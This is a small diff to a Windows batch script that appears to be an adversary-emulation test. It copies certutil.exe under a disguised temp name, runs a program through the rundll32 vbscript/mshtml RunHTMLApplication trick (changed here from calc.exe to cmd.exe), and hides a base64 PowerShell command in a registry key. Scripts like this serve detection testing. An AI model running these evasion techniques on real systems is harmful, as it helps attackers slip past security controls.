@@ -1,7 +1,7 @@
 @echo on
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
-rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{calc.exe}"),0)
+rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{cmd.exe}"),0)
 
 start /wait reg.exe add "HKEY_CURRENT_USER\Software\Classes\XSample" /v XXX /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2Nucm1hcmsudHh0IiAtdmFsdWUgInRhcmdldCI="
 
